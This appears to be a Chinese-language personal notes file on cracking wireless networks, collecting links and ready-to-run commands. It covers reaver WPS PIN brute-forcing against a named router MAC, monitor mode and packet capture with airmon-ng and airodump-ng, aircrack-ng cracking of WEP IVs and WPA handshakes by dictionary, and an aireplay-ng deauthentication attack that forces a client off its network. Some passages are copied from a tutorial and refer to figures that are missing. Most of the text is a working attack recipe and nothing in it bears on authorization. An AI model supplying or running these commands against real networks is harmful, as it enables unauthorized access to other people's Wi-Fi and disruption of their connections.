# 破解无线

> 参考 http://netsecurity.51cto.com/art/201105/264844_3.htm

* 另一种思路

> 参考 PIN http://www.geekfan.net/7846/

具体的方法 http://xiao106347.blog.163.com/blog/static/21599207820136161132836/

## 怎样的可以pin

`54e.` 的即可

方式:

	sudo reaver -i mon0 -b 40:16:9F:D8:27:A2 -S -v -n

显示更多信息 

	sudo reaver -i mon0 -b 40:16:9F:D8:27:A2 -S -v -n

指定特定的pin码

	sudo reaver -i mon0 -b 40:16:9F:D8:27:A2 -S -v -n -p 40869200

# 查看

当然，通过输入iwconfig查看也是可以滴。这个命令专用于查看无线网卡，不像ifconfig那样查看所有适配器。

    iwconfig 
	
在Linux下，我们使用Aircrack-ng套装里的airmon-ng工具来实现，具体命令如下：

    airmon-ng start wlan0
    
步骤3：探测无线网络，抓取无线数据包。

在激活无线网卡后，我们就可以开启无线数据包抓包工具了，这里我们使用Aircrack-ng套装里的airmon-ng工具来实现，具体命令如下：

不过在正式抓包之前，一般都是先进行预来探测，来获取当前无线网络概况，包括AP的SSID、MAC地址、工作频道、无线客户端MAC及数量等。只需打开一个Shell，输入具体命令如下：

    airodump-ng mon0 
  
参数解释：

mon0为之前已经载入并激活监听模式的无线网卡。如下图8所示。

# 监听

既然我们看到了本次测试要攻击的目标，就是那个SSID名为TP-LINK的无线路由器，接下来输入命令如下：

	airodump-ng --ivs -w longas -c 6 wlan0 

参数解释：

* `--ivs` 这里的设置是通过设置过滤，不再将所有无线数据保存，而只是保存可用于破解的IVS数据报文，这样可以有效地缩减保存的数据包大小；
* `-c` 这里我们设置目标AP的工作频道，通过刚才的观察，我们要进行攻击测试的无线路由器工作频道为6；
* `-w` 后跟要保存的文件名，这里w就是“write写”的意思，所以输入自己希望保持的文件名，如下图10所示我这里就写为longas。那么，小黑们一定要注意的是：这里我们虽然设置保存的文件名是longas，但是生成的文件却不是longase.ivs，而是longas-01.ivs。



图10

注意：这是因为airodump-ng这款工具为了方便后面破解时候的调用，所以对保存文件按顺序编了号，于是就多了-01这样的序号，以此类推，在进行第二次攻击时，若使用同样文件名longas保存的话，就会生成名为longas-02.ivs的文件，一定要注意哦，别到时候找不到又要怪我没写清楚：）

啊，估计有的朋友们看到这里，又会问在破解的时候可不可以将这些捕获的数据包一起使用呢，当然可以，届时只要在载入文件时使用longas*.cap即可，这里的星号指代所有前缀一致的文件。

在回车后，就可以看到如下图11所示的界面，这表示着无线数据包抓取的开始。


图11

	airodump-ng -c 6  -w <文件名> --ivs mon0


# 破解
破解 web加密,需要iv2万左右

	aircrack-ng  *.ivs 


破解 wpa加密, 一个握手包+海量字典:

	aircrack-ng  -w <字典文件> *.cap 

强制断开

	aireplay-ng -0 1  -a 6C:E8:73:50:85:F0 -c 00:1B:77:BE:19:FC mon0


# 暴力wap的

	airodump-ng -c 6  -w [filename] mon0

或者

	aircrack-ng  -w [字典] *.cap 
